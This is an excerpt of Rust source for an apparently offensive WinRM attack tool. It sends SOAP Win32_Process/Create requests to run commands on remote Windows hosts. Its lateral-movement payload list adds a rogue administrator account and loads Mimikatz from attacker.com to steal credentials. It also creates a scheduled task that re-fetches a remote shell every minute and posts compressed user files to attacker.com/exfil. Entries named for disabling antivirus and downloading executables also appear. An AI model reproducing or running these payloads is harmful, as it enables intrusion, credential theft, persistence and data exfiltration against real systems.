...
pub async fn exec(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    for (name, cmd) in &commands {
        let soap_body = format!(
            r#"<?xml version="1.0" encoding="UTF-8"?><s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><w:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Process/Create</w:Action></s:Header><s:Body><p:Create><p:CommandLine>{}</p:CommandLine></p:Create></s:Body></s:Envelope>"#,
            cmd
        );
        match client
            .post(url)
...
pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    if status == 401 {
        println!(
            "  {} WinRM endpoint accessible (auth required)",
            "[+]".green().bold()
        );
    } else if status == 200 {
...
pub async fn lateral(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    let lateral_payloads = [
        (
            "Add user",
            "net user attacker P@ss123 /add && net localgroup administrators attacker /add",
        ),
        (
            "Download exec",
        ...
        (
            "Mimikatz",
            "powershell -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/Invoke-Mimikatz.ps1\"); Invoke-Mimikatz'",
        ),
        (
            "Persistence",
            "schtasks /create /tn Update /tr \"powershell -c 'IEX(http://attacker.com/shell.ps1)'\" /sc minute /mo 1",
        ),
        (
            "Disable AV",
        ...
        (
            "Exfil data",
            "powershell -c 'Compress-Archive -Path C:\\Users\\* -DestinationPath C:\\temp\\data.zip; IWR -Uri http://attacker.com/exfil -Method POST -InFile C:\\temp\\data.zip'",
        ),
    ];

    for (name, cmd) in &lateral_payloads {
        let soap_body = format!(
            r#"<?xml version="1.0"?><s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body><p:Create xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><p:CommandLine>{}</p:CommandLine></p:Create></s:Body></s:Envelope>"#,
            cmd
        );
        match client
            .post(url)
